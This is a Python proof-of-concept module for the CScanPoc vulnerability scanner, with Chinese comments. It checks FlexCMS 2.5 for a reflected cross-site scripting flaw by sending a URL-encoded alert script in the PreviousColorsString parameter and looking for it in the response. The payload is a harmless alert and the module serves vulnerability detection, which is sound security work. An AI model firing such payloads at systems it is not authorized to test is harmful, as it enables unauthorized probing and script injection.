# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'FlexCMS_0000'  # 平台漏洞编号
    name = 'FlexCMS 2.5 - inc-core-admin-editor-previouscolorsjs.php Cross-Site Scripting Vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2008-08-15'  # 漏洞公布时间
    desc = '''
        FlexCMS是一套网站内容管理系统。 
        FlexCMS 2.5以及之前的版本中的inc-core-admin-editor-previouscolorsjs.php存在跨站脚本攻击漏洞,
        当register_globals选项被激活时，远程攻击者可以借助reviousColorsString参数，
        注入任意的web脚本或HTML。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/32254/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FlexCMS'  # 漏洞组件名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '328f7e58-d0bf-44a3-8c4f-191c6838bbab'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + \
                '/inc-core-admin-editor-previouscolorsjs.php?PreviousColorsString=%3Cscript%3Ealert(/SebugTest/)%3C/script%3E'

            res = requests.get(vul_url, timeout=5)

            if '>alert(/SebugTest/)' in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
